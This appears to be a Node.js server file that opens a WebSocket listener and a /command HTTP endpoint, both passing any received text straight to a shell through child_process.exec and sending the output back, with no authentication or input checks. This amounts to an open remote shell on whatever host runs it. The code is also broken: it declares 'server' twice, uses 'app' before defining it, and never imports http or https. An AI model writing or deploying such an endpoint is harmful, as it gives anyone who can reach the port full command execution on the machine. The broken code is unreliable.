const express = require('express');
const WebSocket = require('ws');
const { exec } = require('child_process');
const server = http.createServer(app);
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 10000;

app.use(express.static('public'));

const server = https.createServer({
    cert: fs.readFileSync('./ssl/cert.pem'),
    key: fs.readFileSync('./ssl/private.key')
}, app);

const wss = new WebSocket.Server({ server });

wss.on('connection', (ws) => {
    console.log('New client connected');
    
    ws.on('message', (message) => {
        const command = message.toString();
        console.log('Received command:', command);
        
        exec(command, { timeout: 30000 }, (error, stdout, stderr) => {
            const output = error ? error.message : stdout + stderr;
            ws.send(output);
        });
    });
    
    ws.on('close', () => {
        console.log('Client disconnected');
    });
    
    ws.on('error', (error) => {
        console.log('WebSocket error:', error);
    });
});

app.get('/health', (req, res) => {
    res.status(200).json({ status: 'online', clients: wss.clients.size });
});

app.post('/command', express.text(), (req, res) => {
    const command = req.body;
    exec(command, { timeout: 30000 }, (error, stdout, stderr) => {
        res.send(stdout + stderr);
    });
});

server.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
